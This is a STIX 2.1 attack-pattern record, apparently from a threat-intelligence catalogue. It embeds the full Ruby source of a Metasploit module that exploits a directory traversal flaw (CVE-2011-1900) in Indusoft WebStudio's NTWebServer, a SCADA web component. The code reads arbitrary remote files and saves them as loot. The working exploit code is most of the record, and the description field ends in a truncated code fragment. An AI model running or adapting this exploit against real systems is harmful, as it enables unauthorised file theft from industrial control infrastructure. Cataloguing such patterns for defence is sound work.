{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46338c0a-def2-477e-a5c0-6e4cf1079674",
    "created": "2024-08-14T16:26:49.087095Z",
    "modified": "2024-08-14T16:26:49.087099Z",
    "name": "Indusoft WebStudio NTWebServer Remote File Access",
    "description": " This module exploits a directory traversal vulnerability in Indusoft WebStudio. The vulnerability exists in the NTWebServer component and allows to read arbitrary remote files with the privileges of the NTWebServer process. The module has been tested successfully on Indusoft WebStudio 6.1 SP6.  'References'   => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess.rb",
            "external_id": "indusoft_ntwebserver_fileaccess.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.indusoft.com/hotfixes/hotfixes.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'Indusoft WebStudio NTWebServer Remote File Access',\n      'Description'  =>  %q{\n          This module exploits a directory traversal vulnerability in Indusoft WebStudio.\n        The vulnerability exists in the NTWebServer component and allows to read arbitrary\n        remote files with the privileges of the NTWebServer process. The module has been\n        tested successfully on Indusoft WebStudio 6.1 SP6.\n      },\n      'References'   =>\n        [\n          [ 'CVE', '2011-1900' ],\n          [ 'OSVDB', '73413' ],\n          [ 'BID', '47842' ],\n          [ 'URL', 'http://www.indusoft.com/hotfixes/hotfixes.php' ]\n        ],\n      'Author'       =>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      OptString.new('RFILE', [true, 'Remote File', '/windows\\\\win.ini']),\n      OptInt.new('DEPTH', [true, 'Traversal depth', 3])\n    ])\n\n    register_autofilter_ports([ 80 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'     => \"/\",\n      'method'  => 'GET'\n    })\n\n    if not res\n      print_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return\n    end\n\n    accessfile(ip)\n  end\n\n  def accessfile(rhost)\n\n    traversal = \"../\" * datastore['DEPTH']\n    rfile = \"\"\n\n    if datastore['RFILE'][0] == \"/\"\n      rfile = datastore['RFILE'][1..datastore['RFILE'].length-1]\n    else\n      rfile = datastore['RFILE']\n    end\n\n    print_status(\"#{rhost}:#{rport} - Checking if file exists...\")\n\n    res = send_request_cgi({\n      'uri'      => \"/#{traversal}#{rfile}\",\n      'method'   => 'HEAD'\n    })\n\n    if res and res.code == 200 and res.message =~ /File Exists/\n      print_good(\"#{rhost}:#{rport} - The file exists\")\n    else\n      print_error(\"#{rhost}:#{rport} - The file doesn't exist\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Retrieving remote file...\")\n\n    res = send_request_cgi({\n      'uri'      => \"/#{traversal}#{rfile}\",\n      'method'   => 'GET'\n    })\n\n    if res and res.code == 200 and res.message =~ /Sending file/\n      loot = res.body\n      if not loot or loot.empty?\n        print_status(\"#{rhost}:#{rport} - Retrieved empty file\")\n        return\n      end\n      f = ::File.basename(datastore['RFILE'])\n      path = store_loot('indusoft.webstudio.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n      print_good(\"#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}\")\n      return\n    end\n\n    print_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ]
}